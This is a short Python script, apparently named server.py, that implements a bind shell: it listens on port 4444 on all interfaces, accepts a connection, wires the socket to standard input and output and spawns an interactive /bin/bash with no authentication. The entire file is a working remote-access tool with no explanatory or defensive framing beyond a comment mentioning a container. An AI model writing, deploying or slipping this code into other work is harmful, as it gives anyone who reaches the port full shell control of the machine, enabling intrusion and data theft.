# server.py
import socket
import subprocess
import os
import pty

HOST = "0.0.0.0"  # listen on all interfaces inside container
PORT = 4444       # you can change port

def main():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((HOST, PORT))
    soc.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}...")

    conn, addr = soc.accept()
    print(f"[+] Connection from {addr}")

    # Spawn a bash shell and redirect I/O to socket
    os.dup2(conn.fileno(), 0)  # stdin
    os.dup2(conn.fileno(), 1)  # stdout
    os.dup2(conn.fileno(), 2)  # stderr
    pty.spawn("/bin/bash")     # interactive shell

if __name__ == "__main__":
    main()